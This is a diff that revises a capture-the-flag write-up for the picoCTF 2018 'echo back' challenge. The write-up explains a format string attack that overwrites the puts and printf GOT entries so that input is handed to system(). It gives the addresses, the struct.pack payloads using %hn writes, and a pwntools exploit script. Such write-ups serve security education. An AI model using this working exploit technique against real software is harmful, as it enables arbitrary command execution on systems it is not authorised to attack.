@@ -9,10 +9,9 @@ Can you get a shell and retreive the flag? Connect to it with nc 2018shell.picoc
 
 
 > # Introduction 
-In this write-up we;re gonna perform a format string attack. This is the second time we are doing this (a bit more complex), so go check
+In this write-up we're gonna perform a format string attack. This is the second time we are doing this (a bit more complex), so go check
 the first one [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/tree/master/authenticate).
 
-////
 
 
 
@@ -100,13 +99,13 @@ Dump of assembler code for function vuln:
 End of assembler dump.
 ```
 
-Hmm, system() function looks familiar and so important. Here, system calls echo end prints in the stdout: 'input message:'
+Hmm, system() function looks familiar and so important. Here, 'system' calls **echo** and prints in the stdout: 'input message:'.
+
 read() reads from the stdin and waits for input. 
+
 printf() prints the input. Again, printf takes only one argument and that's a vulnerability. 
+
 And we have two puts functions that print some strings(e.g. Thanks for sending this message).
-
-About rep stos you can learn [here]().
-
 
 Okay, we can exploit printf. What the heck we could do with that.
 We know that with printf and %n we can write something in memory. What is our plan?
@@ -117,17 +116,19 @@ Sometimes things are so simple that we can't see them lying in front of us.
 # > First step: Global Offset Table && code execution redirection
 
 If you don't know about GOT and PLT and the way to exploit them see [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/tree/master/got-shell%3F).
-First of all, we want to change **puts@got.plt** address with the address of vuln. We want to get back to the start. On the second pass
-we are going to change **printf@got.plt** address with the address of system. Think about it. Printf() takes the input from read function as an argument.
-So if only printf() could behave as if it were system()? 
-Answer: We can pass from stdin whatever argument we want (e.g. cat flag.txt)
+First of all, we want to change **puts@got.plt** address with the address of vuln. We want to get back to the start. 
+(Remember that a name's challenge is a hint: echo back)
+
+On the second pass we are going to change **printf@got.plt** address with the address of system. Think about it. Printf() takes the input from read function as an argument.
+What if printf() could behave as if it were system()? 
+Answer: We can pass from stdin whatever argument we want (e.g. cat flag.txt).
 
 Now we have a plan!!!
 
 # >  Crafting the payload
 
 Let's do this thing. It's not that easy. 
-From the first format string attack we know how to modify a variable and what **%n** is. But, now we want to write to address of
+From the first format string attack we know how to modify a variable and what **%n** does. But, now we want to write to address of
 puts@got.plt the address of vuln. So we want to write this number: 0x080485ab in hex, and 134514091 in decimal. Based on what we know about %n
 it's impossible to write before %n such a big input. Unfortunately , buffer is not that big.
 Have you ever heard about format in printf?
@@ -160,8 +161,7 @@ Output:
 Hmm, that's interesting. Similarly, if we write **printf("%134514091d", var)** we'll  have a so small argument/input and at the same time a huge output. 
 So, we can write to memory an address like 0x080485ab. But, it takes time to print so many spaces. We are engineers and we can find a faster way to do this. 
 We can write two bytes at a time. So first 85ab and then 0804. 
-Before that ofcourse we have to follow the same procedure as the  previous challenge with format string attack and write in the input the address we want to write the value
-and find when we hit this address. When we find those info we can start:
+Before that, ofcourse we have to follow the same procedure as the previous challenge with format string attack, add to the input the address that we want to overwrite and then find when we hit this address. When we find those info we can start:
 
 ```python 
 VULN = 0x080485ab
@@ -173,7 +173,7 @@ PRINT_PLT = 0x804a010
 
 payload1 = ''
 payload1 += struct.pack("I", PUTS_PLT)
-payload1 += struct.pack("I", PUTS_PLT+2) # this is the address for the next 2 bytes: 0804
+payload1 += struct.pack("I", PUTS_PLT+2) # this is the address for the next 2 bytes : 0804
 payload1 += "%7$34211x" # 85ab =  34219 (Decimal) and we subtract 8 because we wrote 2 addresses before(8 bytes)
 payload1 += "%7$hn"  # "7" is the times we want to print %x to find the address we want to modify. With 7$ we can hit it immediately.
 
@@ -192,10 +192,10 @@ So, first we write something like :
 payload1 += "%8$x"
 payload1 += "%8$hn"
 ```
-and then we subtract the number we see in the higher two bytes of got.plt address with 10804 to find the right number of spaces to instert.
+and then we subtract the number we see in the higher two bytes of got.plt address with 10804 to find the right number of spaces to add.
 
 Exactly the same we have to do to change printf_plt address with system address. That's a version of the exploit. I have two versions in the repository.
-The second one uses pwntools.
+The following makes use of pwntools.
 
 ```python
 import struct
@@ -231,8 +231,12 @@ r.sendafter('input your message:', payload2)
 r.interactive()
 ```
 
-That's it, we got our flag. 
+Then, program waits for your input, but now that input is passed as an argument to system function. 
+**cat flag.txt** will do the job.
+
+Congrats. That's it, we got our flag. 
 To see more about format string attacks click [here](https://www.youtube.com/watch?v=0WvrSfcdq1I&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18).
+
 
 
 
